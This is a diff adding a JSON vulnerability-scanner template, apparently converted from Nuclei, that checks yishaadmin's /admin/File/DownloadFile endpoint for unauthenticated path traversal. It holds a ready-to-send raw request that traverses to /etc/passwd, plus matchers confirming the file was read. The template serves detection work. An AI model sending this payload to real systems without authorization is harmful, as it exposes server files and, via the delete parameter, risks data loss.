@@ -1,0 +1,146 @@
+{
+  "id": "yishaadmin-lfi",
+  "name": "yishaadmin - Local File Inclusion",
+  "author": "Evan Rubinstein",
+  "severity": "HIGH",
+  "description": "yishaadmin is vulnerable to local file inclusion via the \"/admin/File/DownloadFile\" endpoint and allows files to be downloaded, read or deleted without any authentication.",
+  "references": [
+    "https://huntr.dev/bounties/2acdd87a-12bd-4ce4-994b-0081eb908128/",
+    "https://github.com/liukuo362573/YiShaAdmin/blob/master/YiSha.Util/YiSha.Util/FileHelper.cs#L181-L186"
+  ],
+  "tags": [
+    "lfi",
+    "yishaadmin",
+    "huntr"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {},
+  "variables": {},
+  "variablesType": "sniper",
+  "cweId": "CWE-22",
+  "cvssScore": "7.5",
+  "cvssMetrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "GET /admin/File/DownloadFile?filePath\u003dwwwroot/..././/..././/..././/..././/..././/..././/..././/..././etc/passwd\u0026delete\u003d0 HTTP/1.1\nHost: {{Hostname}}\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "REGEX",
+          "part": "body",
+          "values": [
+            "root:.*:0:0:"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "internal": "true",
+          "group": 1
+        },
+        {
+          "type": "STATUS",
+          "values": [
+            "200"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "AND",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "yishaadmin-lfi",
+    "info": {
+      "name": "yishaadmin - Local File Inclusion",
+      "author": "Evan Rubinstein",
+      "severity": "high",
+      "description": "yishaadmin is vulnerable to local file inclusion via the \"/admin/File/DownloadFile\" endpoint and allows files to be downloaded, read or deleted without any authentication.",
+      "reference": [
+        "https://huntr.dev/bounties/2acdd87a-12bd-4ce4-994b-0081eb908128/",
+        "https://github.com/liukuo362573/YiShaAdmin/blob/master/YiSha.Util/YiSha.Util/FileHelper.cs#L181-L186"
+      ],
+      "classification": {
+        "cvss_metrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+        "cvss_score": "7.5",
+        "cwe_id": "CWE-22"
+      },
+      "metadata": {
+        "max_request": 1
+      },
+      "tags": "lfi,yishaadmin,huntr"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "GET /admin/File/DownloadFile?filePath\u003dwwwroot/..././/..././/..././/..././/..././/..././/..././/..././etc/passwd\u0026delete\u003d0 HTTP/1.1\nHost: {{Hostname}}\n"
+        ],
+        "matchers_condition": "and",
+        "matchers": [
+          {
+            "type": "regex",
+            "part": "body",
+            "regex": [
+              "root:.*:0:0:"
+            ],
+            "group": 1,
+            "internal": true
+          },
+          {
+            "type": "status",
+            "status": [
+              200
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
